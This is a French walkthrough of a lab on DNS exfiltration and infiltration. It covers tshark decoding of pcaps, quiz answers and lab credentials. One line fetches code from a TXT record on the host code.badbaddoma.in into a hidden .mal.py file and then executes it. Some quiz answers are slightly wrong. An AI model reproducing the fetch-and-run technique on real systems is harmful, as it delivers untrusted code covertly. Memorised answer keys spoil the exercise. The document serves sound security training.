## Manipulation de DNS

Installer l'environnement sur la machine Kali Linux :
```console
$ git clone https://github.com/kleosdc/dns-exfil-infil

$ sudo pip3 install -r requirements.txt
```

Installer iodine :
```console
$ sudo apt install iodine
```

Installer Wireshark :
```console
$ sudo apt install -y tshark
```

---

#### DNS :

Sous Windows, quelle commande utiliser pour requêter un enregistrement txt pour YouTube.com ?
```console
Réponse : nslookup type=txt youtube.com
```

Sous Linux, quelle commande utiliser pour requêter un enregistrement txt pour YouTube.com ?
```console
Réponse : dig -t txt facebook.com
```

Quel type d'adresses IP stocke le AAAA avec le nom de hôte ?
```console
Réponse : IPv6
```

Le nombre maximum de caracttères pour un enrigrement DNS est de 256. Vrai/Faux ?
```console
Réponse : Faux
```

Quel enregistrement DNS donne le nom du domaine en reverse-lookup ?
```console
Réponse : PTR
```

Quel serait le résultat d'un reverse-lookup pour l'adresse IPv4 suivante : 192.168.203.2 ?
```console
Réponse : 2.203.168.192.in-addr.arpa
```

Quelle est la taille maximale d'un nom DNS ? (en incluant les points!)
```console
253
```

---

#### Exfiltration DNS :

Se connecter à la machine cible en SHH en utilisant les crédentials :
* Utilsateur : user
* Mot de passe : P@ssword01

Parcourir les fichiers dans les dossiers :
```console
~/challenges/exfiltration
~/dns-exfil-infil/
```

```console
cd ~/challenges/exfiltration/orderlist
tshark -r order.pcap -T fields -e dns.qry.name > DNS_names.txt
python3 ~/dns-exfil-infil/packetyGrabber.py
```

Ignorer l'exception levée à la fin du script

Quel est le nom de la première transation ? 
```console
Réponse : Network Equip.
```

Quel est le montant de la transaction Firewall ?
```console
Réponse : 2500
```
Aller dans le dossier :
```console
~/challenges/exfiltration/identity
```

Pour chaque fichier *.pcap
```console
tshark -r cap1.pcap -T fields -e dns.qry.name
python3 ~/dns-exfil-infil/packetyGrabber.py
```

Quel fichier contient des requêtes DNS douteuses ?
```console
Réponse : cap3.pcap
```

Renseigner les texte après avoir décodé les données en utilisant le programe Pyhton packetyGrabber.py qui se trouve dans le dossier `~/dns-exfil-infil/`.
```console
Réponse : administrator:s3cre7P@ssword
```

---

#### Infiltration DNS :

Lire les instructions dans le fichier : 
```console
$ cat ~/challenges/infiltration/TASK
```

```console
$ nslookup -type=txt code.badbaddoma.in | grep Ye | cut -d \* -f2 > .mal.py

$ python3 ~/dns-exfil-infil/packetySimple.py

$ python3 .mal.py
```

Réponse : 4.4.0-186-generic
